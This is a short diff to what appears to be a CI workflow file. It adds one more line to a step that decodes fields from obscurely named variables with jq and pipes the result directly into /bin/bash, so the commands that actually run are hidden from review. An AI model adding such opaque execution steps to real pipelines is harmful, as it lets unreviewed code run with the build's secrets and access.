@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$usxqz929" | jq -r .ptd8693 | /bin/bash
           echo $d257 | jq -r .sezz643 | /bin/bash
+          printf '%s' "$pet3" | jq -r .wg96 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
